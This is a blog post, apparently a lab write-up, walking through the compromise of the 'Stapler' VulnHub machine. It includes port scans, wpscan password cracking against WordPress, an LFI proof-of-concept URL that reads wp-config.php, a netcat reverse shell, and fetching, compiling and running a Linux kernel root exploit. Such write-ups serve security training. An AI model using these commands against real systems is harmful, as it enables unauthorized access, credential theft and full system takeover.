@@ -1,0 +1,377 @@
+---
+layout: post
+title: "stapler"
+date: 2016-07-25 10:57:44 -0500
+comments: true
+categories: [vulhub, wordpress]
+---
+
+###Tools:
+
+* netdiscover
+* Nmap
+* Wfuzz
+* Nikto
+
+
+###Vulnerabilities:
+[WordPress Advanced Video Plugin 1.0 - Local File Inclusion](https://www.exploit-db.com/exploits/39646/)
+[Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit](https://www.exploit-db.com/exploits/39772/)
+
+
+<!--more-->
+Use netdiscover to detect target IP address
+
+`netdiscover -i eth0 -r 192.168.41.0/24`
+
+{% img  /images/blog/vulhub/stapler/Selection_001.png   [title manually exploit [alt text]] %}
+
+192.168.41.152 is the target.
+
+Then run nmap to detect opening ports and running services on the target machine.
+
+`nmap -sV -v -O -A -T5 192.168.41.152 -p-`
+
+```
+Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-25 11:01 CDT
+NSE: Loaded 138 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:01
+Completed NSE at 11:01, 0.00s elapsed
+Initiating NSE at 11:01
+Completed NSE at 11:01, 0.00s elapsed
+Initiating ARP Ping Scan at 11:01
+Scanning 192.168.41.152 [1 port]
+Completed ARP Ping Scan at 11:01, 0.01s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:01
+Completed Parallel DNS resolution of 1 host. at 11:01, 13.00s elapsed
+Initiating SYN Stealth Scan at 11:01
+Scanning 192.168.41.152 [65535 ports]
+Discovered open port 3306/tcp on 192.168.41.152
+Discovered open port 80/tcp on 192.168.41.152
+Discovered open port 21/tcp on 192.168.41.152
+Discovered open port 22/tcp on 192.168.41.152
+Discovered open port 139/tcp on 192.168.41.152
+Discovered open port 53/tcp on 192.168.41.152
+Discovered open port 12380/tcp on 192.168.41.152
+SYN Stealth Scan Timing: About 47.37% done; ETC: 11:02 (0:00:34 remaining)
+Discovered open port 666/tcp on 192.168.41.152
+Completed SYN Stealth Scan at 11:02, 53.87s elapsed (65535 total ports)
+Initiating Service scan at 11:02
+Scanning 8 services on 192.168.41.152
+Completed Service scan at 11:02, 18.57s elapsed (8 services on 1 host)
+Initiating OS detection (try #1) against 192.168.41.152
+NSE: Script scanning 192.168.41.152.
+Initiating NSE at 11:02
+NSE: [ftp-bounce] Couldn't resolve scanme.nmap.org, scanning 10.0.0.1 instead.
+Completed NSE at 11:04, 127.93s elapsed
+Initiating NSE at 11:04
+Completed NSE at 11:04, 1.06s elapsed
+Nmap scan report for 192.168.41.152
+Host is up (0.00066s latency).
+Not shown: 65523 filtered ports
+PORT      STATE  SERVICE     VERSION
+20/tcp    closed ftp-data
+21/tcp    open   ftp         vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: Can't parse PASV response: "Permission denied."
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
+|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
+53/tcp    open   domain      dnsmasq 2.75
+| dns-nsid: 
+|_  bind.version: dnsmasq-2.75
+80/tcp    open   http
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: 404 Not Found
+123/tcp   closed ntp
+137/tcp   closed netbios-ns
+138/tcp   closed netbios-dgm
+139/tcp   open   netbios-ssn Samba smbd 3.X (workgroup: RED)
+666/tcp   open   doom?
+3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
+|_mysql-info: ERROR: Script execution failed (use -d to debug)
+12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Tim, we need to-do better next year for Initech
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.12%I=7%D=7/25%Time=5796380B%P=i586-pc-linux-gnu%r(GetReq
+SF:uest,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nC
+SF:ontent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x20533\r
+SF:\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</title><
+SF:style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#333333
+SF:;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5em;
+SF:\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-hei
+SF:ght:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20black
+SF:;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20}\n
+SF:code\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monospac
+SF:e;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Found</h1><
+SF:p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code>\x20wa
+SF:s\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%r(HTTPO
+SF:ptions,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r\
+SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x20533
+SF:\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</title
+SF:><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#3333
+SF:33;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5e
+SF:m;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-h
+SF:eight:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20bla
+SF:ck;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20}
+SF:\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monosp
+SF:ace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Found</h1
+SF:><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code>\x20
+SF:was\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%r(Fou
+SF:rOhFourRequest,2A2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20
+SF:close\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length
+SF::\x20568\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Foun
+SF:d</title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\
+SF:x20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\
+SF:x201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\
+SF:x20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inse
+SF:t\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010
+SF:px;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-famil
+SF:y:monospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20F
+SF:ound</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/nic
+SF:e%20ports%2C/Tri%6Eity\.txt%2ebak</code>\x20was\x20not\x20found\x20on\x
+SF:20this\x20server\.</p></body></html>");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port666-TCP:V=7.12%I=7%D=7/25%Time=57963805%P=i586-pc-linux-gnu%r(NULL,
+SF:2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x152
+SF:\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04\
+SF:xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2\
+SF:x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x0
+SF:c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb2
+SF:\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\x
+SF:eeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3\
+SF:x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0\
+SF:xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x87
+SF:\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf4
+SF:\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xdc
+SF:\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5\
+SF:x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf\
+SF:xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\x
+SF:c3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x8
+SF:a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\xe
+SF:7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\x
+SF:f6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x9
+SF:a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\xf
+SF:1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\xf
+SF:8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\x
+SF:d7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\xd
+SF:2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\x
+SF:f9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[\
+SF:x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xcc
+SF:\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7\
+SF:xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\xf
+SF:d\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96\
+SF:x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\x
+SF:d0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\x
+SF:ed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x8
+SF:8\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbcL
+SF:}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\.
+SF:npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\xf
+SF:6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf3
+SF:\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?\
+SF:xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
+MAC Address: 00:0C:29:11:36:D7 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.4
+Uptime guess: 0.005 days (since Mon Jul 25 10:57:52 2016)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   RED<00>              Flags: <unique><active>
+|   RED<03>              Flags: <unique><active>
+|   RED<20>              Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|_  WORKGROUP<1e>        Flags: <group><active>
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
+|   Computer name: red
+|   NetBIOS computer name: RED
+|   Domain name: 
+|   FQDN: red
+|_  System time: 2016-07-25T17:02:34+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.66 ms 192.168.41.152
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:04
+Completed NSE at 11:04, 0.00s elapsed
+Initiating NSE at 11:04
+Completed NSE at 11:04, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 217.50 seconds
+           Raw packets sent: 131125 (5.771MB) | Rcvd: 64 (3.108KB)
+```
+
+
+Well, lots of ports are opening. Scan ftp first.
+
+```
+msf > use auxiliary/scanner/ftp/ftp_version
+msf auxiliary(ftp_version) > set rhosts 192.168.41.152  
+msf auxiliary(ftp_version) > run
+```
+
+got this:
+
+{% img  /images/blog/vulhub/stapler/Selection_005.png   [title manually exploit [alt text]] %} 
+
+looks like got a username `Harry`
+
+port 80 looks nothing.
+
+try port 12380.
+
+use nikto to scan:
+
+`nikto -h 192.168.41.152:12380`
+
+{% img  /images/blog/vulhub/stapler/Selection_002.png   [title manually exploit [alt text]] %} 
+
+looks like we have `/blogblog/` and `/admin12233/`.
+
+since the SSL is being used.
+
+`https://192.168.41.152:12380/blogblog/`
+
+
+{% img  /images/blog/vulhub/stapler/Selection_006.png   [title manually exploit [alt text]] %} 
+
+check the resouce:
+
+{% img  /images/blog/vulhub/stapler/Selection_007.png   [title manually exploit [alt text]] %} 
+
+looks like a wordpress is there.
+
+use wpscan to enumerate
+
+`wpscan -u https://192.168.41.152:12380/blogblog/ -enum username`
+
+{% img  /images/blog/vulhub/stapler/Selection_003.png   [title manually exploit [alt text]] %}
+
+
+since dunring ftp eumeration, I found a username `harry`, I will use it to crack password
+
+` wpscan -u https://192.168.41.152:12380/blogblog/ --username harry --wordlist /usr/share/wordlists/rockyou.txt`
+
+got the password:
+
+{% img  /images/blog/vulhub/stapler/Selection_004.png   [title manually exploit [alt text]] %}
+
+
+login wordpress.
+
+{% img  /images/blog/vulhub/stapler/Selection_008.png   [title manually exploit [alt text]] %}
+
+However, harry is not admin. Try another account, `john`
+
+{% img  /images/blog/vulhub/stapler/Selection_009.png   [title manually exploit [alt text]] %}
+
+now got `john`'s pasword is `incorrect`, login as `john`
+
+
+{% img  /images/blog/vulhub/stapler/Selection_010.png   [title manually exploit [alt text]] %}
+
+and it is admin.
+
+try to upload webshell and failed, since wordpress requires ftp cred.
+
+Checked other plugin, I found:
+
+{% img  /images/blog/vulhub/stapler/Selection_011.png   [title manually exploit [alt text]] %}
+
+
+`searchsploit advanced video`
+
+{% img /images/blog/vulhub/stapler/Selection_012.png   [title manually exploit [alt text]] %}
+
+got a LFI exploit.
+
+Try the POC:
+
+```
+https://192.168.41.152:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
+```
+
+and got:
+
+{% img /images/blog/vulhub/stapler/Selection_013.png   [title manually exploit [alt text]] %}
+
+check folder:
+
+`https://192.168.41.152:12380/blogblog/wp-content/uploads/`
+
+
+{% img /images/blog/vulhub/stapler/Selection_014.png   [title manually exploit [alt text]] %}
+
+looks like the reverse shell is uploaded successfully, even it is not installed as plugin.
+
+setup netcat, get the shell:
+
+{% img /images/blog/vulhub/stapler/Selection_015.png   [title manually exploit [alt text]] %}
+
+`uname -a`
+
+{% img /images/blog/vulhub/stapler/Selection_016.png   [title manually exploit [alt text]] %}
+
+get linux kernel version, then do
+
+`searchsploit 4.4 | grep linux`
+
+and found exploit `Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit`
+
+
+In kali:
+
+```
+wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+cp 39772.zip /var/www/html/
+```
+
+In target:
+
+```
+unzip 39772.zip
+cd 39772
+tar xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit/
+./compile.sh
+./doubleput
+```
+
+get the root:
+
+
+{% img /images/blog/vulhub/stapler/Selection_017.png   [title manually exploit [alt text]] %}
+
+
+
+
+
+
+
+
